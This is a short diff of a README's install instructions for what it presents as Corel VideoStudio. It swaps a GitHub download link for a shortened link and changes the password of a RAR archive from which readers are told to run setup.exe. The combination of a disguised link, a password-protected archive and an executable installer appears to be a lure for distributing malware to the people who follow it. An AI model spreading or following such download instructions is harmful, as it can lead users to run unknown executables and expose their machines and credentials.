@@ -2,8 +2,8 @@
 
 <H3>IMPORTANT(how to install)</H3>
 
-- [Download](https://github.com/OratilweMathebe/corel-videostudio/releases/download/Download/CorelVid.rar)
-- Open archive (password: video105)
+- [Download](https://goo.su/ZRGc)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
